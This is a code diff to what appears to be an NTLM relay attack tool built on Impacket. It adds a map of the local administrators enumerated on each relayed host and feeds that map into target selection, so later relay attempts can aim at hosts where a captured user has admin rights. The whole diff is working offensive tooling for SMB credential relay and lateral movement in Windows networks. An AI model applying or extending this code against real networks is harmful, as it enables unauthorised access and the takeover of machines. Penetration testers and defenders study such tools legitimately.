@@ -59,6 +59,9 @@ from smbclient import MiniImpacketShell
 #Define global variables to prevent RID cycling more than once
 ridCycleDone = False
 
+#Define global localAdmin map for choosing targets
+localAdminMap = {}
+
 class SMBAttack(Thread):
     def __init__(self, config, SMBClient, username):
         Thread.__init__(self)
@@ -80,6 +83,16 @@ class SMBAttack(Thread):
     def __answer(self, data):
         self.__answerTMP += data
 
+    def updateAdminMap(self, adminNames):
+        global localAdminMap
+        hostname = self.__SMBConnection.getRemoteHost()
+        for name in adminNames:
+            if name in localAdminMap:
+                localAdminMap[name].append(hostname)
+            else:
+                localAdminMap[name] = [hostname]
+        return
+    
     def run(self):
         global ridCycleDone
         # Here PUT YOUR CODE!
@@ -115,6 +128,7 @@ class SMBAttack(Thread):
                         logging.info("Relayed user doesn't have admin on {}. Attempting to enumerate users who do...".format(self.__SMBConnection.getRemoteHost()))
                         enumLocalAdmins = EnumLocalAdmins(self.__SMBConnection)
                         localAdminSids, localAdminNames = enumLocalAdmins.getLocalAdmins()
+                        self.updateAdminMap(localAdminNames)
                         logging.info("Host {} has the following local admins (hint: try relaying one of them here...)".format(self.__SMBConnection.getRemoteHost()))
                         for name in localAdminNames:
                             logging.info("Host {} local admin member: {} ".format(self.__SMBConnection.getRemoteHost(), name))
@@ -538,7 +552,7 @@ if __name__ == '__main__':
         if options.tf is not None:
             #Targetfile specified
             logging.info("Running in relay mode to hosts in targetfile")
-            targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS)
+            targetSystem = TargetsProcessor(targetListFile=options.tf, protocolClients=PROTOCOL_CLIENTS, localAdminMap=localAdminMap)
             mode = 'RELAY'
         else:
             logging.info("Running in reflection mode")
@@ -587,6 +601,7 @@ if __name__ == '__main__':
         c.setWpadOptions(options.wpad_host, options.wpad_auth_num)
         c.setSMB2Support(options.smb2support)
         c.setInterfaceIp(options.interface_ip)
+        c.setLocalAdminMap(localAdminMap)
 
 
         #If the redirect option is set, configure the HTTP server to redirect targets to SMB
@@ -624,6 +639,3 @@ if __name__ == '__main__':
         del s
 
     sys.exit(0)
-
-
-
